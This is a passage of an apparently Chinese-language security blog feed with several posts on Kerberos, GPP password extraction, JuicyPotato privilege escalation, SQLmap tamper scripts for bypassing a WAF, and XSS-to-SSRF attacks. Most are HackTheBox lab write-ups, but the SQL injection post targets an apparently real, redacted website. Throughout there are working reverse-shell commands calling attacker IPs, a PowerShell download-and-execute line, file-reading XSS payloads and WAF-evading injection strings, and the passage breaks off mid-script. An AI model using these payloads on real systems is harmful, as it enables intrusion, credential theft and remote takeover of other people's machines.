    <link href="https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-25T13:49:57.000Z</published>
    <updated>2020-04-25T14:48:21.127Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Kerberos简介：</strong></p><ul><li><p>Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）</p></li><li><p>几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）</p></li><li><p>Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥</p></li></ul><p><img src="https://github.com/Twe1ve-web/Twe1ve-web.github.io/raw/master/images/keberos.jpg" alt=""></p><p><img src="keberos.jpg" alt=""></p><h2 id="1、AS-REQ"><a href="#1、AS-REQ" class="headerlink" title="1、AS-REQ"></a>1、AS-REQ</h2><p>Client将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS</p><h2 id="2、AS-REP"><a href="#2、AS-REP" class="headerlink" title="2、AS-REP"></a>2、AS-REP</h2><p>AS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    </p><p>AS向Clinet发送两条消息：        </p><p><strong>消息1</strong>包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;<strong>也就是使用TGS密钥加密TGT</strong></p><p>步骤1中用户提供的信息+TGS SESSION KEY                </p><p><strong>消息2</strong>包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     </p><pre><code>TGS名称/ID            时间戳            TGS SESSION KEYTGT生存期`</code></pre><p>消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY</p><h2 id="3、TGS-REQ"><a href="#3、TGS-REQ" class="headerlink" title="3、TGS-REQ"></a>3、TGS-REQ</h2><p>(金票攻击发生在此步骤)</p><p>Client向TGS发送两条消息<br><strong>消息1</strong>：[使用TGS SESSION KEY进行加密]  </p><pre><code>你的名称/ID时间戳`</code></pre><p><strong>消息2</strong>：[未加密消息]</p><pre><code>所要请求服务的名称/ID服务的有效生存期</code></pre><p>同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在</p><h2 id="4、-TGS-REPTGS"><a href="#4、-TGS-REPTGS" class="headerlink" title="4、   TGS-REPTGS"></a>4、   TGS-REPTGS</h2><p>使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    </p><pre><code>步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟检查TGT是否过期检查TGS缓存中是否已有该用户凭据，避免重播</code></pre><p>检查无误之后，同样向客户端发送两条消息</p><p><strong>消息1</strong>：[<strong>生成的使用Service Secret Key加密后的TGS</strong>]—-&gt;<strong>Kerberos令牌</strong></p><p><strong>消息2</strong>：[TGS Session Key加密]    </p><pre><code>服务名称/ID   时间戳    票据生存期    Service Session Key</code></pre><h2 id="5、AP-REQ"><a href="#5、AP-REQ" class="headerlink" title="5、AP-REQ"></a>5、AP-REQ</h2><p>银票攻击发生在此步骤</p><p>Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    </p><pre><code>用户名称/ID时间戳`</code></pre><p>该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源</p><h2 id="6、AP-REP"><a href="#6、AP-REP" class="headerlink" title="6、AP-REP"></a>6、AP-REP</h2><p>启用相互认证的情况下，交换时间戳进行相互认证</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Kerberos简介：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）&lt;/p&gt;
&lt;/li&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域内提权之滥用GGP</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/</id>
    <published>2020-04-25T13:49:13.000Z</published>
    <updated>2020-04-25T14:46:47.301Z</updated>
    
    <content type="html"><![CDATA[<p>在SYSVOL查找密码组策略首选项（GPP）中的密码</p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong>什么是GPP</strong></p><p>GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途</p><p>一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。</p><p>该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）</p><p>这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：</p><pre><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code></pre><p><strong>1、定位域控制器</strong></p><pre><code>set l   nltest /DSGETDC:echo %logonserver%net time /domain......</code></pre><p><strong>2、查询DC共享目录</strong><br>使用enumlinux或者smbmap检查共享目录：</p><pre><code>smbmap -H 10.10.10.100  ###列出目标用户共享列表---- -----------ADMIN$ NO ACCESSC$ NO ACCESSIPC$ NO ACCESSNETLOGON NO ACCESSreplication read only   SYSVOL NO ACCESSUsers NO ACCESS</code></pre><p><strong>3、连接域共享</strong></p><p>smbclient //active.htb/Replication -N</p><pre><code>smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;</code></pre><p><strong>4、解密</strong><br>使用<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">gpprefdecrypt.py</a>： </p><pre><code>python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在SYSVOL查找密码组策略首选项（GPP）中的密码&lt;/p&gt;
&lt;h1 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是GPP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;G
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JuicyPotato提权</title>
    <link href="https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"/>
    <id>https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-22T06:52:56.000Z</published>
    <updated>2020-04-22T12:05:27.105Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ohpe/juicy-potato/">https://github.com/ohpe/juicy-potato/</a></p><h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广</p><p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p><p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p><p><img src="/images/1.png" alt=""></p><p><img src="2.png" alt=""></p><h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p><p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p><p><strong>自定义COM监听端口</strong></p><p>-l <port>: COM server listen port</p><p><strong>COM监听地址</strong></p><p>-m <ip>: COM server listen address (default 127.0.0.1)</p><p><strong>进程创建模块</strong> </p><p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</p><p><strong>执行指定进程或脚本</strong></p><p>-p <program>: program to launch</p><p><strong>为指定的执行进程选择参数</strong></p><p>-a <argument>: command line argument to pass to program (default NULL)</p><p><strong>RPC服务地址</strong></p><p>-k <ip>: RPC server ip address (default 127.0.0.1)</p><p><strong>RPC服务端口：</strong></p><p>-n <port>: RPC server listen port (default 135)</p><p><strong>支持测试模块；测试并查找clsid</strong></p><p>-z only test CLSID and print token’s user</p><h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="2.png" alt=""></p><p><img src="/images/2.png" alt=""></p><h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p><pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><h1 id="0x04、CLSID快速验证"><a href="#0x04、CLSID快速验证" class="headerlink" title="0x04、CLSID快速验证"></a>0x04、CLSID快速验证</h1><p><strong>[1]获取可用CLSID列表</strong></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">提取CLSID Powershell脚本 GetCLSID.ps1</a></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">同级目录下需要有Join-Object.ps1</a></p><p>GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)</p><pre><code>Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1powershell -ep bypass -f GetCLSID.ps1##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -</code></pre><p><strong>枚举所有满足条件的CLSID:</strong></p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}foreach($a in $CLSID){Write-Host $a.CLSID}</code></pre><p>[2]批处理调用juicypotato.exe逐个测试CLSID</p><p>test_clsid.bat:</p><pre><code>@echo off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><h1 id="0x05、限制条件"><a href="#0x05、限制条件" class="headerlink" title="0x05、限制条件"></a>0x05、限制条件</h1><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ohpe/juicy-potato/&quot;&gt;https://github.com/ohpe/juicy-potato/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x01、前言&quot;&gt;&lt;a href=&quot;#0x01、前言&quot; cl
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一次注入实战引发的SQLMAP修改之路</title>
    <link href="https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"/>
    <id>https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/</id>
    <published>2020-04-19T15:54:24.000Z</published>
    <updated>2020-04-25T14:48:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>首发于先知社区：<a href="https://xz.aliyun.com/t/6864" target="_blank" rel="noopener">https://xz.aliyun.com/t/6864</a></p><p>#一、    前言<br>SQLmap的payload修改一般有两种方式:<br>  1、编写tamper<br>  2、修改/添加sqlmap的xml文件语句自定义payload</p><p>#二、    注入点Fuzz<br>选中目标网站：<a href="http://www.xxxx.com/journals_desc.php?id=40" target="_blank" rel="noopener">http://www.xxxx.com/journals_desc.php?id=40</a><br>单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150651-a71aa4bc-11ad-1.png" alt="image.png"></p><p>Order by 猜字段值为7</p><p>Waf为Modsec，直接使用union select被拦截：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150707-b0415338-11ad-1.png" alt="image.png"></p><p>Fuzz：</p><pre><code>单个union    #不拦截单个select    #不拦截Union select  #拦截union /**/ select #拦截/*!00000union*/ select #内联注释，不拦截/*!50000union*/ select 1,2,3,4,5,6,7 </code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150725-baf1a594-11ad-1.png" alt="image.png"></p><p>此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型<br>解决方法：<br>[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通</p><p>[2]采用报错注入</p><p>#三、编写简单Tamper脚本绕过<br>（使用自带的modsecurityzeroversioned.py不能绕过）</p><p>报错注入过程中，发现主要过滤关键词from和函数concat（）</p><p>1、concat()被过滤:<code>concat()--&gt;concat/**/()</code>  对应tamper脚本concat2concatcomment.py如下：</p><pre><code>#!/usr/bin/env python2&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():passdef tamper(payload, **kwargs):return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)</code></pre><p>2、from被过滤，<code>from</code>–&gt;<code>/*!44144from*/</code>对应tamper脚本from.py如下：</p><pre><code>#!/usr/bin/env python2&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():passdef tamper(payload, **kwargs):return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)</code></pre><p>验证：</p><pre><code>python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191203115117-291b7916-1580-1.png" alt="QQ图片20191203115040.png"></p><p><code>--dbs</code>读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）<br>payload in sqlmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191203114925-e65a320c-157f-1.png" alt="QQ图片20191203114836.png"></p><p><code>--tables</code>读取，很遗憾，读取失败</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150750-ca51e544-11ad-1.png" alt="image.png"></p><p>再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？</p><p>但是，，，，坑的是竟然不是因为过滤引起的？？？？</p><p>#四、修改SQLmap的xml文件语句<br>实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？<br>再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。<br>大家自行比较一下下面这两条语句看看能不能看出问题~<br>1、</p><pre><code>https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)</code></pre><p>2、</p><pre><code>https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)</code></pre><p>下面讲几个概念</p><p>[1]table和colums在mysql中是特殊字符</p><p>[2]反引号是sql语言的转义字符</p><p>[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号 <code></code> ，（但在指定其他数据库时不能加，否则会被认作是表）</p><p>我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml</p><pre><code>information_schema.tables --&gt; information_schema.`tables`</code></pre><p>当然，columns也需要修改</p><pre><code>information_schema.columns --&gt; information_schema.`columns`</code></pre><p>修改之后跑表：</p><pre><code>python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tables</code></pre><p>payload in sqlamp（比对一下payload，看看效果）:</p><pre><code>66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150800-d00c86a6-11ad-1.png" alt="image.png"></p><p>跑列值也是一样的，就不多说了，直接上图</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150805-d34505f0-11ad-1.png" alt="image.png"></p><p>#五、关于SQLmap自定义payload的一些思考<br>SQLmap的payload修改，其实并不复杂。</p><p>tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考<a href="https://payloads.online/archivers/2017-06-08/1" target="_blank" rel="noopener">https://payloads.online/archivers/2017-06-08/1</a></p><p>修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。<br>    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.<code>TABLES</code>的修改<br>不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150815-d8ab5148-11ad-1.png" alt="image.png"></p><p>假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/6864&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6864&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;#一、    前言&lt;br&gt;SQLmap
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从两道靶场题目看XHR</title>
    <link href="https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"/>
    <id>https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/</id>
    <published>2020-04-19T15:51:48.000Z</published>
    <updated>2020-04-19T15:53:35.592Z</updated>
    
    <content type="html"><![CDATA[<p>首发于先知社区：<a href="https://xz.aliyun.com/t/7473/" target="_blank" rel="noopener">https://xz.aliyun.com/t/7473/</a></p><p>#0x01、什么是XHR<br>XHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。</p><p>特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至<strong>支持 HTTP 以外的协议（包括 file:// 和 FTP）</strong></p><p>#0x02、利用一：读取本地文件</p><p>适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）</p><p>以Hackthebox的book靶场为例：</p><p><strong>情景描述</strong>：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145435-7d10b84a-6e65-1.png" alt="image.png"></p><p><strong>验证</strong>：Title字段插入内容更改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">Date</span>());</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145448-84b5f1fa-6e65-1.png" alt="image.png"></p><p><strong>进一步利用</strong>：利用XHR读取本地文件</p><p>本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;</p><pre><code>&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145504-8e7ebc80-6e65-1.png" alt="image.png"></p><p>没有回显</p><pre><code>&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;</code></pre><p>还是没有回显</p><p>姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：</p><pre><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send(); &lt;/script&gt;</code></pre><p>Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145528-9c598164-6e65-1.png" alt="image.png"></p><p>同样的方法可以直接读取到该服务器的用户ssh私钥进行登录</p><p>#0x03、利用二：由XSS到SSRF之命令执行</p><p>这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例</p><p><strong>情景描述</strong>：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145537-a1ac7bbc-6e65-1.png" alt="image.png"></p><p><strong>简易思路</strong>:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制</p><p><strong>漏洞利用</strong>：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）<br>Payload：</p><pre><code>&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;</code></pre><p>nc -lvvp 9999 即可回弹shell</p><p>#0x04、一点小小扩展<br>这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。<br>这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：<br>XSS框直接插入：<br>    <script src="http://10.10.16.21:8000/reverse.js"></script></p><p>Reverse.js文件内容如下：</p><pre><code>function paintfunc(){ var http = new XMLHttpRequest();     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;     http.open(&apos;POST&apos;, url, true);     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);     